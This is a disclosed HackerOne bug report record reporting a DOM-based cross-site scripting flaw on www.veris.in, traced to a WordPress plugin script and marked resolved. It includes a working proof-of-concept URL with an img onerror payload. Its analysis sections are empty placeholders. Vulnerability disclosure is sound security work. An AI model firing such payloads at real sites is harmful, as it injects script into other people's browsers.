---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '119453'
original_report_id: '119453'
title: www.veris.in DOM based XSS
weakness: Cross-site Scripting (XSS) - Generic
team_handle: veris
created_at: '2016-02-29T13:44:45.748Z'
disclosed_at: '2016-04-22T05:18:49.765Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# www.veris.in DOM based XSS

## Metadata

- HackerOne Report ID: 119453
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: veris
- Disclosed At: 2016-04-22T05:18:49.765Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,
An attacked can execute arbitrary js at your main page 
https://www.veris.in/?#<img src=x onerror=alert(1)>

vulnerable js source:
https://www.veris.in/wp-content/plugins/Ultimate_VC_Addons/assets/min-js/ultimate.min.js?ver=7e111f63322706ef9e00ec1e58f2edf4

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
